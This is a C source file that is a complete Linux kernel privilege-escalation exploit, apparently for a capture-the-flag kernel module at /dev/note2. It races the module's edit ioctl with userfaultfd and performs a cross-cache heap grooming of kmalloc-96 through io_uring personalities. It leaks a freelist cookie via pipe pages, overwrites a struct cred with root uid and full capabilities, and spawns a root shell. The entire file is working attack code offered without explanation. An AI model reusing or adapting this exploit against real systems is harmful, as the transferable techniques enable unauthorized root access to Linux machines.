#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <errno.h>
#include <inttypes.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <poll.h>
#include <stdnoreturn.h>
#include <string.h>
#include <unistd.h>

#include <linux/userfaultfd.h>

#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <linux/capability.h>
#include <sys/xattr.h>

/* musl is stupid btw */
#undef NGROUPS_MAX
#undef _IOC
#undef _IO
#undef _IOR
#undef _IOW
#undef _IOWR

#include <linux/io_uring.h>

#define CC_OVERFLOW_FACTOR 8
enum {
    CC_RESERVE_PARTIAL_LIST = 0,
    CC_ALLOC_VICTIM_PAGE,
    CC_FILL_VICTIM_PAGE,
    CC_EMPTY_VICTIM_PAGE,
    CC_OVERFLOW_PARTIAL_LIST
};

struct cross_cache
{
    uint32_t objs_per_slab;
    uint32_t cpu_partial;
    struct
    {
        int64_t *overflow_objs;
        int64_t *pre_victim_objs;
        int64_t *post_victim_objs;
    };
    uint8_t phase;
    int (*allocate)();
    int (*free)(int64_t);
};

#define ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))
// n must be a power of 2
#define ALIGN(x, n) ((x) + (-(x) & ((n)-1)))

#define CLONE_FLAGS CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

#define IOC_MAGIC '\xFF'

#define IO_ADD _IOWR(IOC_MAGIC, 0, struct ioctl_arg)
#define IO_EDIT _IOWR(IOC_MAGIC, 1, struct ioctl_arg)
#define IO_SHOW _IOWR(IOC_MAGIC, 2, struct ioctl_arg)
#define IO_DEL _IOWR(IOC_MAGIC, 3, struct ioctl_arg)

struct ioctl_arg
{
    uint64_t idx;
    uint64_t size;
    uint64_t addr;
};

static noreturn void fatal(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

static int userfault_fd;
static void *userfault_page;

static pthread_t userfault_pthread;

static int note_fd;

static struct cross_cache *kmalloc96_cc;
size_t n_queues;

struct kernel_cred {
    uint32_t usage;
    uint32_t uid;
    uint32_t gid;
    uint32_t suid;
    uint32_t sgid;
    uint32_t euid;
    uint32_t egid;
    uint32_t fsuid;
    uint32_t fsgid;
    uint32_t securebits;
    uint64_t cap_inheritable;
    uint64_t cap_permitted;
    uint64_t cap_effective;
    uint64_t cap_bset;
    uint64_t cap_ambient;
    /* ... not relevant*/
};

struct pipe_pair {
    union {
        struct {
            int read;
            int write;
        };
        int __raw[2];
    };
};

struct user_cap_data_struct {
    uint32_t effective;
    uint32_t permitted;
    uint32_t inheritable;
};

/* cross-cache stuff */

static inline int64_t cc_allocate(struct cross_cache *cc,
                                  int64_t *repo,
                                  uint32_t to_alloc)
{
    for (uint32_t i = 0; i < to_alloc; i++)
    {
        int64_t ref = cc->allocate();
        if (ref == -1)
            return -1;
        repo[i] = ref;
    }
    return 0;
}

static inline int64_t cc_free(struct cross_cache *cc,
                              int64_t *repo,
                              uint32_t to_free,
                              bool per_slab)
{
    for (uint32_t i = 0; i < to_free; i++)
    {
        if (per_slab && (i % (cc->objs_per_slab - 1) == 0))
            continue;
        else
        {
            if (repo[i] == -1)
                continue;
            cc->free(repo[i]);
            repo[i] = -1;
        }
    }
    return 0;
}

/*
 * Reserve enough objects to later overflow the per-cpu partial list */
static inline int64_t reserve_partial_list_amount(struct cross_cache *cc)
{
    uint32_t to_alloc = cc->objs_per_slab * (cc->cpu_partial + 1) * CC_OVERFLOW_FACTOR;
    cc_allocate(cc, cc->overflow_objs, to_alloc);
    return 0;
}

static inline int64_t allocate_victim_page(struct cross_cache *cc)
{
    uint32_t to_alloc = cc->objs_per_slab - 1;
    cc_allocate(cc, cc->pre_victim_objs, to_alloc);
    return 0;
}

static inline int64_t fill_victim_page(struct cross_cache *cc)
{
    uint32_t to_alloc = cc->objs_per_slab + 1;
    cc_allocate(cc, cc->post_victim_objs, to_alloc);
    return 0;
}

static inline int64_t empty_victim_page(struct cross_cache *cc)
{
    uint32_t to_free = cc->objs_per_slab - 1;
    cc_free(cc, cc->pre_victim_objs, to_free, false);
    to_free = cc->objs_per_slab + 1;
    cc_free(cc, cc->post_victim_objs, to_free, false);
    return 0;
}

static inline int64_t overflow_partial_list(struct cross_cache *cc)
{
    uint32_t to_free = cc->objs_per_slab * (cc->cpu_partial + 1) * CC_OVERFLOW_FACTOR;
    cc_free(cc, cc->overflow_objs, to_free, true);
    return 0;
}

static inline int64_t free_all(struct cross_cache *cc)
{
    uint32_t to_free = cc->objs_per_slab * (cc->cpu_partial + 1);
    cc_free(cc, cc->overflow_objs, to_free, false);
    empty_victim_page(cc);

    return 0;
}

int64_t cc_next(struct cross_cache *cc)
{
    switch (cc->phase++)
    {
    case CC_RESERVE_PARTIAL_LIST:
        return reserve_partial_list_amount(cc);
    case CC_ALLOC_VICTIM_PAGE:
        return allocate_victim_page(cc);
    case CC_FILL_VICTIM_PAGE:
        return fill_victim_page(cc);
    case CC_EMPTY_VICTIM_PAGE:
        return empty_victim_page(cc);
    case CC_OVERFLOW_PARTIAL_LIST:
        return overflow_partial_list(cc);
    default:
        return 0;
    }
}

void cc_deinit(struct cross_cache *cc)
{
    free_all(cc);
    free(cc->overflow_objs);
    free(cc->pre_victim_objs);
    free(cc->post_victim_objs);
    free(cc);
}

struct cross_cache *cc_init(uint32_t objs_per_slab,
                            uint32_t cpu_partial,
                            void *allocate_fptr,
                            void *free_fptr)
{
    struct cross_cache *cc = malloc(sizeof(struct cross_cache));
    if (!cc)
    {
        perror("init_cross_cache:malloc\n");
        return NULL;
    }
    cc->objs_per_slab = objs_per_slab;
    cc->cpu_partial = cpu_partial;
    cc->free = free_fptr;
    cc->allocate = allocate_fptr;
    cc->phase = CC_RESERVE_PARTIAL_LIST;

    uint32_t n_overflow = objs_per_slab * (cpu_partial + 1) * CC_OVERFLOW_FACTOR;
    uint32_t n_previctim = objs_per_slab - 1;
    uint32_t n_postvictim = objs_per_slab + 1;

    cc->overflow_objs = malloc(sizeof(int64_t) * n_overflow);
    cc->pre_victim_objs = malloc(sizeof(int64_t) * n_previctim);
    cc->post_victim_objs = malloc(sizeof(int64_t) * n_postvictim);

    return cc;
}

static inline int pin_cpu(int cpu)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    return sched_setaffinity(0, sizeof cpuset, &cpuset);
}

static int rlimit_increase(int rlimit)
{
    struct rlimit r;
    if (getrlimit(rlimit, &r))
        fatal("rlimit_increase:getrlimit");

    if (r.rlim_max <= r.rlim_cur)
    {
        printf("[+] rlimit %d remains at %.lld", rlimit, r.rlim_cur);
        return 0;
    }
    r.rlim_cur = r.rlim_max;
    int res;
    if (res = setrlimit(rlimit, &r))
        fatal("rlimit_increase:setrlimit");
    else
        printf("[+] rlimit %d increased to %lld", rlimit, r.rlim_max);
    return res;
}

static void note_add(const void *data, size_t size)
{
    struct ioctl_arg arg = {
        .addr = (uint64_t)data,
        .size = size,
    };

    if (ioctl(note_fd, IO_ADD, &arg) != 0)
    {
        fatal("add");
    }
}

static void note_edit(int idx, const void *data)
{
    struct ioctl_arg arg = {
        .idx = idx,
        .addr = (uint64_t)data,
    };

    if (ioctl(note_fd, IO_EDIT, &arg) != 0)
    {
        fatal("edit");
    }
}

static void note_show(int idx, void *data)
{
    struct ioctl_arg arg = {
        .idx = idx,
        .addr = (uint64_t)data,
    };

    if (ioctl(note_fd, IO_SHOW, &arg) < 0)
    {
        fatal("show");
    }
}

static void note_del(int idx)
{
    struct ioctl_arg arg = {
        .idx = idx,
    };

    if (ioctl(note_fd, IO_DEL, &arg) < 0)
    {
        fatal("del");
    }
}

static void *thread_note_edit(void *addr)
{
    pin_cpu(0);
    note_edit(0, addr);
    puts("[+] note_edit() succeeded");
}

static int ufd_unblock_page_copy(void *unblock_page, void *content_page, size_t *copy_out)
{
    struct uffdio_copy copy = {
        .dst = (uintptr_t)unblock_page,
        .src = (uintptr_t)content_page,
        .len = 0x1000,
        .copy = (uintptr_t)copy_out,
        .mode = 0};

    printf("unblocking %p (copying 0x1000 bytes from %p)", unblock_page, content_page);
    if (ioctl(userfault_fd, UFFDIO_COPY, &copy))
        fatal("UFFDIO_COPY failed");
    return 0;
}

static int sys_io_uring_setup(size_t entries, struct io_uring_params *p)
{
    return syscall(__NR_io_uring_setup, entries, p);
}


static int uring_create(size_t n_sqe, size_t n_cqe)
{
    struct io_uring_params p = {
        .cq_entries = n_cqe,
        .flags = IORING_SETUP_CQSIZE
    };

    int res = sys_io_uring_setup(n_sqe, &p);
    if (res < 0)
        fatal("io_uring_setup() failed");
    return res;
}

static int alloc_n_creds(int uring_fd, size_t n_creds)
{
    for (size_t i = 0; i < n_creds; i++) {
        struct __user_cap_header_struct cap_hdr = {
            .pid = 0,
            .version = _LINUX_CAPABILITY_VERSION_3
        };

        struct user_cap_data_struct cap_data[2] = {
            {.effective = 0, .inheritable = 0, .permitted = 0},
            {.effective = 0, .inheritable = 0, .permitted = 0}
        };

        /* allocate new cred */
        if (syscall(SYS_capset, &cap_hdr, (void *)cap_data))
            fatal("capset() failed");

        /* increment refcount so we don't free it afterwards*/
        if (syscall(SYS_io_uring_register, uring_fd, IORING_REGISTER_PERSONALITY, 0, 0) < 0)
            fatal("io_uring_register() failed");
    }
}

static void *userfault_thread(void *arg)
{
    struct uffd_msg blockers[2];
    struct uffd_msg msg;
    struct uffdio_copy copy;

    uint64_t *scratch = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    pin_cpu(0);

    for (size_t i = 0; i < 2; i++)
    {
        if (read(userfault_fd, &msg, sizeof(msg)) != sizeof(msg))
        {
            fatal("userfault read");
        }
        else if (msg.event != UFFD_EVENT_PAGEFAULT)
        {
            fatal("unexpected uffd event");
        }

        printf("[+] got userfault block %ld (addr %.16llx)\n", i, msg.arg.pagefault.address);
        blockers[i] = msg;
    }


    struct pipe_pair pipes[16];
    for (size_t i = 0; i < ARRAY_SIZE(pipes); i++)
        pipe(pipes[i].__raw);

    int uring_cred_dumps[2] = {uring_create(0x80, 0x100), uring_create(0x80, 0x100)};

    cc_next(kmalloc96_cc); /* free surrounding objects*/
    cc_next(kmalloc96_cc); /* fill up partial lists */

    /* sleep for rcu*/
    usleep(200000);

    note_del(0);
    note_add("aaa", 2);

    /* Reallocate freed kmalloc-96 slab as a pipe page. */
    uint64_t dummy_buf[0x1000 / 8] = {};
    for (size_t i = 0; i < ARRAY_SIZE(pipes); i++)
        if (write(pipes[i].write, dummy_buf, 0x1000) < 0)
            fatal("write() to pipe failed");

    /* unblock to trigger memcpy(). */
    size_t copied_size = 0;
    ufd_unblock_page_copy((void *)blockers[0].arg.pagefault.address, scratch, &copied_size);

    usleep(200000);
    uint64_t cookie = 0, cookie_idx = 0;
    size_t pipe_idx;
    for (pipe_idx = 0; pipe_idx < ARRAY_SIZE(pipes); pipe_idx++) {
        /* kmalloc-96 is not naturally aligned to PAGESIZE, so we can read this all without worrying
         * about prematurely freeing our page. */
        for (size_t i = 0; i < 42; i++) {
            uint64_t chunk[0x0c];

            if (read(pipes[pipe_idx].read, &chunk, 96) <= 0)
                fatal("read() from pipe failed");

            uint64_t potential_cookie = chunk[0];

            printf("%.16lx\n", potential_cookie);
            if (!cookie && potential_cookie) {
                cookie = potential_cookie;
                cookie_idx = i;
            }
        }

        if (cookie) {
            break;
        }
    }

    if (cookie) {

        /* If we didn't land on a cred boundary, bail out. We'd crash anyway. */
        if ((cookie_idx * 96) % 192 != 0) {
            /* make the memcpy() just write into our controlled pipe page again, so no harm is done. */
            ufd_unblock_page_copy((void *)blockers[1].arg.pagefault.address, scratch, &copied_size);
            fatal("UaF object was not aligned to 192 bytes. Try again..");
        }

        /* Before releasing the page again, we empty the cred freelist 
         * so any new cred allocations will get a new slab */
        alloc_n_creds(uring_cred_dumps[0], 0x4000);

        /* Release page*/
        close(pipes[pipe_idx].read);
        close(pipes[pipe_idx].write);
    } else {
        /* this error path is a bit problematic, we don't know where the write went.. 
         * still, it's better to get the other write over with now.
        */
        ufd_unblock_page_copy((void *)blockers[1].arg.pagefault.address, scratch, &copied_size);
        fatal("cross-cache failed. Try again..");
    }

    printf("pipe %ld, offset +0x%.4lx: cookie %.16lx\n", pipe_idx, cookie_idx * 96, cookie);

    /* Pre-allocate struct creds to reclaim the page. 
     * Free them immediately afterwards so we can reallocate them for tasks. */
    alloc_n_creds(uring_cred_dumps[1], 32);
    close(uring_cred_dumps[1]);

    /* wait for rcu to finish so creds are actually freed. */
    usleep(200000);

    struct pipe_pair child_comm;
    pipe(child_comm.__raw);

    /* realloc creds, now belong to child tasks */
    for (size_t i = 0; i < 32 * 2; i++) {
        
        if (fork())
            continue;
        
        sleep(2);
        uid_t uid = getuid();
        printf("uid: %d\n", uid);
        if (!uid) {
            char dummy[8];
            write(child_comm.write, &dummy, sizeof dummy);
            system("sh");
        }

        exit(0);
        
    }

    sleep(1);

    struct kernel_cred *cred = (void*)scratch;

    cred->usage = 1;
    cred->uid = cred->euid = cred->fsuid = 0;
    cred->gid = cred->egid = cred->fsgid = 0;
    cred->securebits = 0; /* SECUREBITS_DEFAULT */
    cred->cap_effective = cred->cap_permitted = cred->cap_inheritable = cred->cap_bset = 0x1fffffffful;
    cred->cap_ambient = 0;

    for (size_t i = 0; i < 96 / 8; i++)
        scratch[i] ^= cookie;

    ufd_unblock_page_copy((void *)blockers[1].arg.pagefault.address, scratch, &copied_size);

    struct pollfd poller[] = { {.events = POLLIN, .fd = child_comm.read}};

    if (poll(poller, 1, 3000) != 1)
        fatal("Could not overwrite struct cred. Try again..");

    sleep(10000);
    return NULL;
}

// Initialize userfaultfd. Must call this before using the other userfault_*
// functions.
static void userfaultfd_init()
{
    for (size_t i = 0; i < 2; i++)
    {
        userfault_fd = syscall(SYS_userfaultfd, O_CLOEXEC);
        if (userfault_fd < 0)
        {
            fatal("userfaultfd");
        }

        userfault_page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
        if (userfault_page == MAP_FAILED)
        {
            fatal("mmap userfaultfd");
        }

        // Enable userfaultfd
        struct uffdio_api api = {
            .api = UFFD_API,
            .features = 0,
        };
        if (ioctl(userfault_fd, UFFDIO_API, &api) < 0)
        {
            fatal("ioctl(UFFDIO_API)");
        }
    }

    pthread_create(&userfault_pthread, NULL, userfault_thread, NULL);

    puts("userfaultfd initialized");
}

// Register a region with userfaultfd and make it inaccessible. The region must
// be page-aligned and the size must be a multiple of the page size.
static void userfaultfd_register(void *addr, size_t len)
{
    assert(((uintptr_t)addr % 0x1000) == 0);
    assert(len >= 0x1000 && len % 0x1000 == 0);

    struct uffdio_register reg = {
        .range = {
            .start = (uintptr_t)addr,
            .len = len,
        },
        .mode = UFFDIO_REGISTER_MODE_MISSING,
    };
    if (ioctl(userfault_fd, UFFDIO_REGISTER, &reg) < 0)
    {
        fatal("ioctl(UFFDIO_REGISTER)");
    }
}

#define OBJS_PER_SLAB 32
#define CPU_PARTIAL 30


int uring_spray_fd;

static int64_t cc_alloc_kmalloc96()
{
    /* This will allocate a io uring identity in kmalloc-96. It can be repeated an arbitrary amount of times for a single uring instance. */
    int res = syscall(SYS_io_uring_register, uring_spray_fd, IORING_REGISTER_PERSONALITY, 0, 0);
    if (res < 0)
        fatal("alloc: io_uring_register() failed");
    
    return res;
}

static void cc_free_kmalloc96(int64_t personality)
{
    if (syscall(SYS_io_uring_register, uring_spray_fd, IORING_UNREGISTER_PERSONALITY, 0, personality) < 0)
        fatal("free: io_uring_register() failed");
}

int main(void)
{
    pthread_t edit_thread;

    pin_cpu(0);
    rlimit_increase(RLIMIT_NOFILE);

    if ((note_fd = open("/dev/note2", O_RDWR)) < 0)
        fatal("Failed to open note fd");

    /* Free any remaining notes from a previous attempt. */
    for (size_t i = 0; i < 0x10; i++) {
        struct ioctl_arg arg = { .idx = i};
        ioctl(note_fd, IO_DEL, &arg);
    }


    userfaultfd_init();

    uint8_t *mem = mmap(NULL, 0x3000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED)
    {
        fatal("mmap fault memory");
    }

    uring_spray_fd = uring_create(0x80, 0x100);
    kmalloc96_cc = cc_init(OBJS_PER_SLAB, CPU_PARTIAL, cc_alloc_kmalloc96, cc_free_kmalloc96);

    userfaultfd_register(mem + 0x1000, 0x2000);

    /* allocate a bunch of kmalloc256 objects, so the next one we allocate will fall into our "victim page" */
    cc_next(kmalloc96_cc);
    cc_next(kmalloc96_cc);
    note_add(mem, 96);

    /* also fill up the victim page */
    cc_next(kmalloc96_cc);

    pthread_create(&edit_thread, NULL, thread_note_edit, mem + 0x1000);
    usleep(20000);
    note_edit(0, mem + 0x2000);
    puts("done");
    sleep(1000000);
}